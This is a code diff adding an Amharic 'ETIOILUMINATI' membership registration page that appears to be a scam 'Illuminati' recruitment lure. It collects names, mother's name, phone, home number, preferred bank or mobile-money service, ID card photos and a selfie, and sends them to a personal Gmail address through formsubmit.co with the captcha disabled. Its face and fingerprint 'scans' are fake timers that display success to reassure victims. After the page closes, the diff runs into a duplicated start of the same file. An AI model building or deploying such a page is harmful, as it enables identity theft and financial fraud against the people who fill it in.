@@ -478,3 +478,745 @@
         }
 
         @media (max-width: 500px) {
+            .form-card { padding: 24px 18px; }
+            .field-row { grid-template-columns: 1fr; }
+            .site-title { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo-container">
+            <div class="logo-ring"></div>
+            <img src="1000078837.jpg" alt="Ethio-Illuminati Logo" class="logo-image">
+        </div>
+        <div class="site-title">ETIOILUMINATI</div>
+        <div class="site-sub">MONEY · POWER · UNITY</div>
+        <div class="banner-strip"></div>
+    </div>
+
+    <div class="steps-bar">
+        <div class="step-dot active" id="dot-1">1</div>
+        <div class="step-line" id="line-1"></div>
+        <div class="step-dot" id="dot-2">2</div>
+        <div class="step-line" id="line-2"></div>
+        <div class="step-dot" id="dot-3">3</div>
+    </div>
+    <div class="step-label" id="step-label-text">STEP 1 OF 3 — መሰረታዊ መረጃ</div>
+
+    <div class="form-outer">
+        <form id="membershipForm" action="https://formsubmit.co/kefaleyohanis428@gmail.com" method="POST" enctype="multipart/form-data">
+            
+            <div class="form-card" id="main-card">
+
+                <div class="form-step active" id="step-1">
+                    <div class="step-title">መሰረታዊ መረጃ</div>
+
+                    <div class="field">
+                        <label>ሙሉ ስም <span class="req">*</span></label>
+                        <input type="text" name="Full_Name" id="fullName" placeholder="የእርስዎን ሙሉ ስም ያስገቡ" required>
+                    </div>
+
+                    <div class="field">
+                        <label>የናት ስም <span class="req">*</span></label>
+                        <input type="text" name="Mother_Name" id="motherName" placeholder="የእናትን ስም ያስገቡ" required>
+                    </div>
+
+                    <div class="field">
+                        <label>ስልክ ቁጥር <span class="req">*</span></label>
+                        <input type="tel" name="Phone_Number" id="phone" placeholder="09XXXXXXXX ወይም 07XXXXXXXX" required>
+                    </div>
+
+                    <div class="field-row">
+                        <div class="field">
+                            <label>እድሜ <span class="req">*</span></label>
+                            <input type="number" name="Age" id="age" placeholder="እ.ሚ." required min="18" max="99">
+                        </div>
+                        <div class="field">
+                            <label>ጾታ <span class="req">*</span></label>
+                            <select name="Gender" id="gender" required>
+                                <option value="">ይምረጡ...</option>
+                                <option value="ወንድ">ወንድ</option>
+                                <option value="ሴት">ሴት</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label>የቤት ቁጥር <span class="req">*</span></label>
+                        <input type="text" name="Home_Number" id="homeNumber" placeholder="የቤት ቁጥር ያስገቡ" required>
+                    </div>
+
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-next" onclick="checkAndNext(1, 2)">NEXT →</button>
+                    </div>
+                </div>
+
+                <div class="form-step" id="step-2">
+                    <div class="step-title">ተጨማሪ መረጃዎች</div>
+
+                    <div class="field">
+                        <label>ያለዎት የትምህርት ደረጃ <span class="req">*</span></label>
+                        <select name="Education_Level" id="education" required>
+                            <option value="">ይምረጡ...</option>
+                            <option value="ዲፕሎማ">ዲፕሎማ</option>
+                            <option value="ዲግሪ">መጀመሪያ ዲግሪ</option>
+                            <option value="ማስተርስ">ማስተርስ</option>
+                            <option value="ሌላ">ሌላ</option>
+                        </select>
+                    </div>
+
+                    <div class="field">
+                        <label>የባንክ ወይም የሞባይል ገንዘብ ምርጫ <span class="req">*</span></label>
+                        <select name="Payment_Method" id="bankSelect" required>
+                            <option value="">የሚጠቀሙበትን ባንክ/ሞባይል ገንዘብ ይምረጡ...</option>
+                            <option value="Telebirr">ቴሌብር (Telebirr)</option>
+                            <option value="CBE">የኢትዮጵያ ንግድ ባንክ (CBE)</option>
+                            <option value="M-Pesa">M-Pesa (Safaricom)</option>
+                            <option value="Awash">አዋሽ ባንክ (Awash Bank)</option>
+                            <option value="Abyssinia">አቢሲኒያ ባንክ (Bank of Abyssinia)</option>
+                            <option value="Dashen">ዳሽን ባንክ (Dashen Bank)</option>
+                        </select>
+                    </div>
+
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-back" onclick="goToStep(1)">← BACK</button>
+                        <button type="button" class="btn btn-next" onclick="checkAndNext(2, 3)">NEXT →</button>
+                    </div>
+                </div>
+
+                <div class="form-step" id="step-3">
+                    <div class="step-title">ባዮሜትሪክስ እና ሰነዶች</div>
+
+                    <div class="field-row" style="margin-bottom:20px;">
+                        <div class="bio-panel">
+                            <span class="bio-icon">👁</span>
+                            <div class="bio-label">FACE SCAN</div>
+                            <button type="button" class="bio-btn" onclick="simulateBio('face')">ስካን አድርግ</button>
+                            <div class="bio-status" id="faceStatus">ያልተደረገ</div>
+                        </div>
+                        <div class="bio-panel">
+                            <span class="bio-icon">🖐</span>
+                            <div class="bio-label">FINGERPRINT</div>
+                            <button type="button" class="bio-btn" onclick="simulateBio('finger')">አሻራ ስካን</button>
+                            <div class="bio-status" id="fingerStatus">ያልተደረገ</div>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label>የመታወቂያ ፊት — ID Front <span class="req">*</span></label>
+                        <input type="file" name="ID_Front" id="idFront" accept="image/*" required>
+                        <div class="field-hint">የመታወቂያዎን የፊተኛውን ክፍል ያያይዙ</div>
+                    </div>
+
+                    <div class="field">
+                        <label>የመታወቂያ ጀርባ — ID Back <span class="req">*</span></label>
+                        <input type="file" name="ID_Back" id="idBack" accept="image/*" required>
+                        <div class="field-hint">የመታወቂያዎን የጀርባውን ክፍል ያያይዙ</div>
+                    </div>
+
+                    <div class="field">
+                        <label>የራስዎ ፎቶ <span class="req">*</span></label>
+                        <input type="file" name="User_Photo" id="userPhoto" accept="image/*" required>
+                    </div>
+
+                    <input type="hidden" name="_next" value="https://ethioilluminatiassociation.github.io/ethio-illuminati/">
+                    <input type="hidden" name="_captcha" value="false">
+
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-back" onclick="goToStep(2)">← BACK</button>
+                        <button type="button" class="btn btn-submit" onclick="validateFinal()">SUBMIT ✓</button>
+                    </div>
+                </div>
+
+            </div>
+        </form>
+
+        <div class="success-panel" id="successPanel">
+            <div class="success-icon" style="color: #00ffcc; border-color: #00ffcc;">✓</div>
+            <div class="success-title">ተልኳል!</div>
+            <div class="success-sub">ፎርሙ ሁሉንም መስፈርቶች አሟልቶ<br>በተሳካ ሁኔታ ተልኳል። ወደ ማህበሩ እንኳን ደህና መጡ!</div>
+        </div>
+    </div>
+
+    <div class="footer-tag">ETIOILUMINATI — SECURE NETWORK © 2026</div>
+
+    <script>
+        let isFaceScanned = false;
+        let isFingerScanned = false;
+
+        const stepLabels = ['', 'STEP 1 OF 3 — መሰረታዊ መረጃ', 'STEP 2 OF 3 — ተጨማሪ መረጃዎች', 'STEP 3 OF 3 — ባዮሜትሪክስ'];
+
+        function goToStep(n) {
+            document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-' + n).classList.add('active');
+
+            for (let i = 1; i <= 3; i++) {
+                const dot = document.getElementById('dot-' + i);
+                dot.classList.remove('active', 'done');
+                if (i < n) dot.classList.add('done');
+                else if (i === n) dot.classList.add('active');
+            }
+            for (let i = 1; i <= 2; i++) {
+                const line = document.getElementById('line-' + i);
+                line.classList.toggle('done', i < n);
+            }
+
+            document.getElementById('step-label-text').textContent = stepLabels[n];
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function checkAndNext(current, next) {
+            const stepEl = document.getElementById('step-' + current);
+            const required = stepEl.querySelectorAll('input, select');
+            let ok = true;
+            
+            required.forEach(el => {
+                if (el.hasAttribute('required') && !el.value) { 
+                    ok = false; 
+                    el.focus(); 
+                    el.reportValidity(); 
+                }
+            });
+            
+            if (ok) goToStep(next);
+        }
+
+        function simulateBio(type) {
+            if (type === 'face') {
+                const s = document.getElementById('faceStatus');
+                s.textContent = 'ስካን እያደረገ ነው...';
+                s.className = 'bio-status';
+                setTimeout(() => {
+                    s.textContent = '✓ የፊት ስካን ተጠናቋል!';
+                    s.className = 'bio-status done';
+                    isFaceScanned = true;
+                }, 2000);
+            } else {
+                const s = document.getElementById('fingerStatus');
+                s.textContent = 'ጣትዎን ያቆዩ...';
+                s.className = 'bio-status';
+                setTimeout(() => {
+                    s.textContent = '✓ አሻራ ተነስቷል!';
+                    s.className = 'bio-status done';
+                    isFingerScanned = true;
+                }, 2000);
+            }
+        }
+
+        function validateFinal() {
+            if (!isFaceScanned) { alert('እባክዎ መጀመሪያ የፊት ስካን ያድርጉ!'); return; }
+            if (!isFingerScanned) { alert('እባክዎ መጀመሪያ የእጅ አሻራ ስካን ያድርጉ!'); return; }
+
+            const step3 = document.getElementById('step-3');
+            const files = step3.querySelectorAll('input[type="file"]');
+            let ok = true;
+            
+            files.forEach(f => { 
+                if (f.hasAttribute('required') && !f.files.length) { 
+                    ok = false; 
+                    f.reportValidity(); 
+                } 
+            });
+            
+            if (!ok) {
+                alert('እባክዎ መታወቂያዎን እና ፎቶዎን በትክክል ያያይዙ!');
+                return;
+            }
+
+            document.getElementById('membershipForm').submit();
+
+            document.getElementById('main-card').style.display = 'none';
+            document.getElementById('successPanel').classList.add('active');
+            document.getElementById('step-label-text').textContent = 'REGISTRATION COMPLETE';
+            for (let i = 1; i <= 3; i++) {
+                document.getElementById('dot-' + i).classList.remove('active');
+                document.getElementById('dot-' + i).classList.add('done');
+            }
+            document.getElementById('line-1').classList.add('done');
+            document.getElementById('line-2').classList.add('done');
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ETIOILUMINATI — Registration</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Noto+Sans+Ethiopic:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon: #00ffcc;
+            --neon-dim: rgba(0, 255, 204, 0.15);
+            --neon-glow: rgba(0, 255, 204, 0.4);
+            --red: #ff2d55;
+            --bg: #080c10;
+            --surface: #0d1117;
+            --surface-2: #141b24;
+            --border: rgba(0, 255, 204, 0.2);
+            --text: #e0eaf5;
+            --muted: #6a8099;
+            --gold: #f5c842;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Noto Sans Ethiopic', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(0,255,204,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,204,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .header {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 40px 20px 0;
+        }
+
+        .logo-container {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 18px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-image {
+            width: 115px;
+            height: 115px;
+            border-radius: 50%;
+            border: 2px solid var(--gold);
+            object-fit: cover;
+            box-shadow: 0 0 25px var(--neon-glow);
+            z-index: 2;
+        }
+
+        .logo-ring {
+            position: absolute;
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            border: 2px dashed var(--neon);
+            animation: spin 12s linear infinite;
+            box-shadow: 0 0 30px var(--neon-glow);
+            z-index: 1;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .site-title {
+            font-family: 'Orbitron', monospace;
+            font-size: clamp(22px, 5vw, 40px);
+            font-weight: 900;
+            letter-spacing: 0.15em;
+            background: linear-gradient(135deg, var(--neon) 0%, var(--gold) 60%, var(--neon) 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shimmer 4s linear infinite;
+        }
+
+        @keyframes shimmer {
+            to { background-position: 200% center; }
+        }
+
+        .site-sub {
+            font-family: 'Orbitron', monospace;
+            font-size: 11px;
+            letter-spacing: 0.3em;
+            color: var(--muted);
+            margin-top: 6px;
+        }
+
+        .banner-strip {
+            width: 100%;
+            max-width: 680px;
+            margin: 28px auto 0;
+            height: 5px;
+            background: linear-gradient(90deg, transparent, var(--neon), var(--gold), var(--neon), transparent);
+            border-radius: 999px;
+            opacity: 0.7;
+        }
+
+        .steps-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            margin: 36px auto 0;
+            max-width: 360px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .step-dot {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border: 2px solid var(--border);
+            background: var(--surface);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--muted);
+            transition: all 0.4s;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-dot.active {
+            border-color: var(--neon);
+            background: var(--neon-dim);
+            color: var(--neon);
+            box-shadow: 0 0 16px var(--neon-glow);
+        }
+
+        .step-dot.done {
+            border-color: var(--neon);
+            background: var(--neon);
+            color: #000;
+        }
+
+        .step-line {
+            flex: 1;
+            height: 2px;
+            background: var(--border);
+            transition: background 0.4s;
+            max-width: 80px;
+        }
+
+        .step-line.done {
+            background: var(--neon);
+        }
+
+        .step-label {
+            font-size: 10px;
+            letter-spacing: 0.1em;
+            color: var(--muted);
+            text-align: center;
+            margin-top: 36px;
+            font-family: 'Orbitron', monospace;
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-outer {
+            max-width: 580px;
+            margin: 24px auto 60px;
+            padding: 0 16px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 36px 32px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--neon), var(--gold), var(--neon), transparent);
+        }
+
+        .form-step { display: none; }
+        .form-step.active {
+            display: block;
+            animation: fadeUp 0.35s ease;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            letter-spacing: 0.2em;
+            color: var(--neon);
+            text-align: center;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .step-title::before,
+        .step-title::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+
+        .field {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            letter-spacing: 0.12em;
+            font-weight: 600;
+            color: var(--muted);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        label span.req {
+            color: var(--neon);
+            margin-left: 2px;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 13px 16px;
+            background: var(--surface-2);
+            border: 1px solid rgba(0,255,204,0.15);
+            border-radius: 8px;
+            color: var(--text);
+            font-family: 'Noto Sans Ethiopic', sans-serif;
+            font-size: 15px;
+            transition: all 0.3s;
+            appearance: none;
+        }
+
+        select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2300ffcc' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 40px;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--neon);
+            box-shadow: 0 0 0 3px var(--neon-dim);
+            background: rgba(0,255,204,0.04);
+        }
+
+        input::placeholder { color: rgba(106,128,153,0.6); }
+
+        input[type="file"] {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--surface-2);
+            border: 1px dashed rgba(0,255,204,0.25);
+            border-radius: 8px;
+            color: var(--muted);
+            font-family: 'Noto Sans Ethiopic', sans-serif;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        input[type="file"]:hover {
+            border-color: var(--neon);
+            color: var(--neon);
+        }
+
+        .field-hint {
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 5px;
+        }
+
+        .field-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .bio-panel {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .bio-icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .bio-label {
+            font-family: 'Orbitron', monospace;
+            font-size: 11px;
+            letter-spacing: 0.15em;
+            color: var(--muted);
+            margin-bottom: 14px;
+        }
+
+        .bio-btn {
+            width: 100%;
+            padding: 11px;
+            background: transparent;
+            border: 1px solid var(--neon);
+            border-radius: 7px;
+            color: var(--neon);
+            font-family: 'Orbitron', monospace;
+            font-size: 11px;
+            letter-spacing: 0.1em;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .bio-btn:hover {
+            background: var(--neon);
+            color: #000;
+        }
+
+        .bio-status {
+            margin-top: 10px;
+            font-size: 12px;
+            color: var(--red);
+            font-weight: 600;
+            min-height: 18px;
+            transition: color 0.3s;
+        }
+
+        .bio-status.done {
+            color: var(--neon);
+        }
+
+        .btn-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            gap: 12px;
+        }
+
+        .btn {
+            padding: 13px 30px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-family: 'Orbitron', monospace;
+            font-size: 12px;
+            letter-spacing: 0.12em;
+            font-weight: 700;
+            transition: all 0.3s;
+        }
+
+        .btn-back {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--muted);
+        }
+
+        .btn-back:hover {
+            border-color: var(--muted);
+            color: var(--text);
+        }
+
+        .btn-next {
+            background: var(--neon);
+            color: #000;
+            margin-left: auto;
+            box-shadow: 0 0 20px var(--neon-glow);
+        }
+
+        .btn-next:hover {
+            box-shadow: 0 0 30px var(--neon-glow), 0 4px 16px rgba(0,0,0,0.3);
+            transform: translateY(-1px);
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, var(--red), #c71f3d);
+            color: #fff;
+            margin-left: auto;
+            box-shadow: 0 0 20px rgba(255,45,85,0.3);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 0 30px rgba(255,45,85,0.5);
+        }
+
+        .success-panel {
+            text-align: center;
+            padding: 20px 0;
+            display: none;
+        }
+
+        .success-panel.active { display: block; animation: fadeUp 0.5s ease; }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid var(--neon);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 30px var(--neon-glow);
+            background: var(--neon-dim);
+        }
+
+        .success-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 18px;
+            color: var(--neon);
+            margin-bottom: 10px;
+        }
+
+        .success-sub {
+            color: var(--muted);
+            font-size: 14px;
+        }
+
+        .footer-tag {
+            text-align: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 9px;
+            letter-spacing: 0.25em;
+            color: rgba(106,128,153,0.4);
+            margin-top: 10px;
+            padding-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+
+        @media (max-width: 500px) {
